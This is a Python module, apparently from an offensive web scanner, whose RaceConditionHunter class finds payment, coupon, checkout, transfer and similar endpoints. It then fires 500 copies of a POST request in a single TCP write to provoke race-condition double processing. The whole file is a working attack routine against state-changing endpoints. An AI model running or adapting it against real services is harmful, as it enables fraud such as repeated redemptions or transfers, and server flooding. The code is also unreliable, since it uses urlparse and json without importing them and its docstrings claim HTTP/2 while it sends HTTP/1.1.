import asyncio
import httpx
import time
from rich.console import Console
from aura.core import state

console = Console()

class RaceConditionHunter:
    """
    ELITE LOGIC: Race Condition (HTTP/2 Turbo)
    Blasts 50+ simultaneous requests using HTTP/2 multiplexing for state-changing endpoints
    (e.g., /api/payments, /api/coupons, /checkout).
    """
    def __init__(self, session=None):
        self.session = session
        
    async def _blast_endpoint(self, url: str, method: str, data: dict, headers: dict) -> list[dict]:
        """
        [⚡ TURBO-RACE] v38.0: Low-Level Socket Multiplexing.
        Fires 500+ requests in a single TCP window to maximize TOCTOU hits.
        """
        findings = []
        parsed = urlparse(url)
        host = parsed.netloc
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"
        
        console.print(f"[bold red][⚡ TURBO-RACE] Engaging Low-Level Socket Multiplexing on {host}:{port}...[/bold red]")
        
        # Construct the raw HTTP/1.1 request (most reliable for raw socket blasts)
        body = json.dumps(data)
        request_raw = (
            f"{method.upper()} {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"Connection: keep-alive\r\n"
        )
        for k, v in headers.items():
            request_raw += f"{k}: {v}\r\n"
        request_raw += "\r\n" + body

        async def _socket_blast():
            try:
                # Open a single TCP connection (or SSL)
                reader, writer = await asyncio.open_connection(host, port, ssl=(parsed.scheme == "https"))
                
                # 500+ requests in one blast
                burst_size = 500 
                console.print(f"[bold red][⚡] Firing {burst_size} requests in a single TCP window...[/bold red]")
                
                # Buffer all requests and send in one write operation if possible
                writer.write(request_raw.encode() * burst_size)
                await writer.drain()
                
                # Read responses (limited to first few to verify success)
                response_data = await reader.read(1024 * 100)
                writer.close()
                await writer.wait_closed()
                
                # Simple count of HTTP/1.1 200 OK in the response stream
                success_count = response_data.count(b"HTTP/1.1 200") + response_data.count(b"HTTP/1.1 201")
                return success_count
            except Exception as e:
                console.print(f"[dim red][!] Blast failed: {e}[/dim red]")
                return 0

        success_count = await _socket_blast()
        
        if success_count > 1:
            console.print(f"[bold red][🔥 TURBO-RACE CONFIRMED] Processed {success_count} concurrent state-changes![/bold red]")
            findings.append({
                "type": "Race Condition (Single-Packet Attack)",
                "severity": "CRITICAL",
                "url": url,
                "content": f"Server processed {success_count} concurrent requests in a single TCP window. Critical TOCTOU vulnerability confirmed."
            })
            
        return findings

    async def scan_urls(self, discovered_urls: list[str]) -> list[dict]:
        """Filter to state-changing endpoints and run HTTP/2 Turbo."""
        state_changing_kws = ["payment", "coupon", "checkout", "transfer", "redeem", "buy", "vote", "like", "follow"]
        targets = [u for u in discovered_urls if any(kw in u.lower() for kw in state_changing_kws)]
        
        if not targets:
            console.print("[dim][Race] No state-changing endpoints identified for Race Condition testing.[/dim]")
            return []
            
        all_findings = []
        for url in targets:
            # We would normally extract expected params/body from the crawl map. For now, we simulate.
            dummy_data = {"amount": 100, "action": "submit"}
            dummy_headers = {"Authorization": "Bearer TEST"}
            res = await self._blast_endpoint(url, "POST", dummy_data, dummy_headers)
            all_findings.extend(res)
            
        return all_findings
